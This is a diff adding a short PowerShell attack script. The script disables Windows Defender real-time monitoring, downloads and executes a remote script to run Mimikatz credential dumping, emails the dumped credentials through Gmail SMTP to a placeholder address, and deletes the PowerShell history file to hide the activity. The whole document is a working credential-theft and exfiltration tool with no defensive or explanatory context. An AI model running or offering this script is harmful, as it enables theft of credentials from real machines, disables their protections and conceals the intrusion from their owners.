@@ -1,0 +1,5 @@
+Set-MpPreference -DisableRealtimeMonitoring $true 
+Invoke-Expression (New-Object Net.WebClient).DownloadString('<direct download link to PS>'); $output = Invoke-Mimikatz -DumpCreds
+$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email>', '<password>'); $ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'mimikatz'; $ReportEmail.Body = $output; $SMTPInfo.Send($ReportEmail); Remove-Item (Get-PSReadlineOption).HistorySavePath
+exit
